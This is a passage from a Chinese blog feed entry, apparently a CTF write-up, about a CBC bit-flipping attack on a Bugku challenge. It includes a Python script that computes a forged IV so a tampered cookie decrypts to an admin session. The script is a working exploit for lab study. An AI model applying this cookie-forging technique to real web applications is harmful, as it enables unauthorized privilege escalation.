又因为是第一个块数据被破坏，第一个块数据是和IV有关，所以只要将在CBC字符翻转攻击，得到新的IV就可以修复第一块数据。 </p><p>贴一下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 得到新的iv值</span></span><br><span class="line">iv = <span class="string">'sDGucEcgR9ixzDNVm6IrpA%3D%3D'</span> <span class="comment"># 填写未修改过的iv</span></span><br><span class="line">cipher = <span class="string">'SjeC+xtTva24pYSPdWXIsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'</span>  <span class="comment"># 填写提示反序列化错误的字符串</span></span><br><span class="line">cipher = base64.b64decode(cipher).decode(<span class="string">'unicode_escape'</span>)</span><br><span class="line">print(<span class="string">'cipher:'</span>,cipher)</span><br><span class="line">iv = base64.b64decode(urllib.parse.unquote(iv))</span><br><span class="line">iv = iv.decode(<span class="string">'unicode_escape'</span>)</span><br><span class="line">newIv = <span class="string">''</span></span><br><span class="line">right = <span class="string">'a:2:&#123;s:8:"userna'</span>  <span class="comment"># 被损坏前正确的明文</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    newIv += chr( ord(right[i]) ^ ord(iv[i]) ^ ord(cipher[i])) </span><br><span class="line">print(urllib.parse.quote(base64.b64encode(newIv.encode(<span class="string">'latin-1'</span>))))</span><br></pre></td></tr></table></figure><p>将得到的iv替换cookie中的iv，刷新一下页面即可以admin身份登录获取flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;最近连着看了几篇CBC翻转攻击相关的文章，又正好遇到了这样的题目，所以来做一波看看一下。题目就是bugku上面的这道题目&lt;a href=&quot;http://118.89.219.210:49168/index.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;传送门&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="资料" scheme="http://chaosec.top/categories/%E8%B5%84%E6%96%99/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
      <category term="Crypto" scheme="http://chaosec.top/tags/Crypto/"/>
    
  </entry>
  
</feed>
